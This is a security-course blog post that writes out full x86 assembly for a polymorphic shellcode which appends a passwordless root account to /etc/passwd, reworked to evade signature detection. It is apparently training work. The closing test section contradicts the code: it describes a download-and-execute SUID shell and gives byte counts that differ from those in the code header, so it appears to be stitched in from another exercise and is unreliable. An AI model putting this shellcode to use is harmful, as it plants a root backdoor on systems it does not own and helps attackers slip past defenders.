# Assignment 6: Append Passwd

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Append Passwd shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-561.php](http://shell-storm.org/shellcode/files/shellcode-561.php "").

This shellcode is meant to add a new system user to the `/etc/passwd` file.


### Shellcode Analysis

To begin, lets grab a copy of that shellcode, compile it, and trace it with GDB:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb1.png "GDB")

As can be appreciated, the shellcode uses the JMP-CALL-POP technique to get the payload address on the stack. The payload in this case is is the following string:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/passwd/gdb2.png "Payload")

which is of course the file name and the user string to be appended. 

The shellcode then goes on to replace the `#` symbols in the payload by `\x00`s, effectively NULL-terminating both strings. Then, a file descriptor for `/etc/passwd` is created with the `open()` system call, and `toor::0:0:t00r:/root:/bin/bash` is appended with the `write()` system call. Finally, the program gracefully exits with the `exit()` system call. 


### Polymorphic Shellcode

To re-create this shellcode, several tweaks were applied to make the shellcode shorter. In no particular order:
- `/etc/passwd` is pushed on the stack, which changes the operations needed before the `open()` call
- `toor::0:0::/root:/bin/sh` is appended, which trims down unnecessary bytes
- payload length is explicitly specified (not calculated at run time)
- additional steps, associated with the original shellcode, are cut and/or rewritten

The final version looks like this:

### a6-passwd.nasm
```nasm
; SLAE Assignment 6: Append Passwd (morphed)
; http://shell-storm.org/shellcode/files/shellcode-561.php
; Original Shellcode Length:	107 
; Morphed Shellcode Length:		82

global _start
section .text
_start:
	jmp short stage

append:
	pop esi
	cdq
	mov byte [esi+24], dl

	push byte 0x5 				; #define __NR_open 5
	pop eax 					; int open(const char *pathname, int flags);
	push edx
	push byte 0x64 				; d
	push word 0x7773			; ws
	push 0x7361702f				; sap/
	push 0x6374652f				; cte/
	mov ebx, esp 				; *pathname -> /etc/passwd
	xor ecx, ecx 		
	inc ecx 					; flags = 1		#define O_WRONLY        00000001
	mov ch, 0x4 				; flags = 401	#define O_NOCTTY        00000400
	int 0x80 					; open

	xchg eax, ebx 				; fd 
	push byte 0x4 				; #define __NR_write 4
	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
	mov ecx, esi 				; *buf -> toor::0:0::/root:/bin/sh
	push byte 0x19 				; length = 25 bytes
	pop edx 					; count = 25
	int 0x80 					; write

	push byte 0x1 				; #define __NR_exit 1
	pop eax 					; int exit(int status)
	int 0x80 					; exit

stage:
	call append
	usr: db "toor::0:0::/root:/bin/shC"
```


Let us go ahead and check if everything works as it should.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/example.png "Example")

It looks like everything works as expected. The file is correctly downloaded, chmod'ed and executed, giving us a SUID root shell.

Now let's go on to check how the morphed version compares to the original shellcode.

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-6/dlexec/length.png "Shellcode length")

Our morphed version is 96 bytes in length, which is of course 12 bytes shorter than the original 108 bytes. 




